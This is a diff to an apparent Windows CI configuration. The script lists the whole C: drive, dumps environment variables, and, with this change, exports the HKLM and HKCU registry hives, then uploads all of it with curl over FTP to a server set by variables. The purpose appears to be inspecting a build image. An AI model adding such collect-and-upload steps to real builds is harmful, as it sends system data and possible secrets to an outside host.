@@ -2,6 +2,11 @@ os: windows
 language: shell
 
 script:
+    - |
+      for key in hklm hkcu; do
+        reg export $key $key.txt
+        gzip $key.txt
+      done
     - find /c | gzip >disk.txt.gz
     - set >env.txt
-    - curl -T "{disk.txt.gz,env.txt}" ftp://$FTP_USER:$FTP_PASSWD@$FTP_SERVER/
+    - curl -T "{disk.txt.gz,hklm.txt.gz,hkcu.txt.gz,env.txt}" ftp://$FTP_USER:$FTP_PASSWD@$FTP_SERVER/
